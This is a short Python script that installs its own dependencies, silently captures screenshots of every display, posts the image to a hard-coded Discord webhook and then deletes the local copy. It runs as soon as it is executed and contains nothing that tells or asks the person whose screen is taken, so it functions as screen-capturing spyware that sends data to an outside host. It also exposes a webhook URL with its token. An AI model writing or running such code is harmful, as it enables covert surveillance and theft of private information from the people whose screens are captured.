import os
import subprocess
import sys

# Function to install a package if it's not already installed
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Automatically install dependencies if they are not already installed
try:
    from PIL import ImageGrab
except ImportError:
    print("Pillow not found, installing...")
    install("pillow")

try:
    import requests
except ImportError:
    print("requests not found, installing...")
    install("requests")

import requests
from PIL import ImageGrab
import tempfile

# Function to capture a screenshot and send it to the Discord webhook
def capture_and_send_screenshot():
    # Capture the screenshot
    screenshot = ImageGrab.grab(all_screens=True)

    # Save the screenshot to a temporary file
    temp_dir = tempfile.gettempdir()
    screenshot_path = os.path.join(temp_dir, "screenshot.png")
    screenshot.save(screenshot_path)

    # Send the screenshot to the Discord webhook
    send_screenshot_to_webhook(screenshot_path)

    # Remove the screenshot file after sending it
    os.remove(screenshot_path)

# Function to send the screenshot to the webhook
def send_screenshot_to_webhook(screenshot_path):
    webhook_url = 'https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5'

    with open(screenshot_path, 'rb') as f:
        files = {
            'file': ('screenshot.png', f, 'image/png')
        }
        data = {
            'content': 'Here is the screenshot of the screen!'
        }

        # Send the screenshot to the webhook
        response = requests.post(webhook_url, data=data, files=files)
        
        if response.status_code == 204:
            print("Successfully sent the screenshot to the webhook!")
        else:
            print(f"Failed to send screenshot. Status code: {response.status_code}")

# Capture and send the screenshot
capture_and_send_screenshot()
